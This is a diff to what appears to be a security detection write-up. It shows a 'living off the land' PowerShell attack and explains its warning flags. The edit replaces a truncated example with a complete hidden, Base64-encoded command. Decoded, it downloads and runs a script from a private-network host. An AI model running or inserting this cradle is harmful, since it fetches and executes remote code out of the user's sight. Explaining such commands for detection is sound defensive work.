@@ -164,7 +164,7 @@ index=* EventCode=10 TargetImage="C:\\Windows\\System32\\lsass.exe"
 
 **The attack.** A single line of "living off the land" — PowerShell, already trusted, already everywhere:
 ```powershell
-powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3...
+powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADIALgAxADIAOAAvAHQAZQBzAHQAJwApAA==
 ```
 
 Three red flags in one command: `-nop` (skip security profiles), `-w hidden` (invisible window), `-enc` (Base64-encoded payload). Decoded, it reached out to the attacker to pull a second-stage payload.
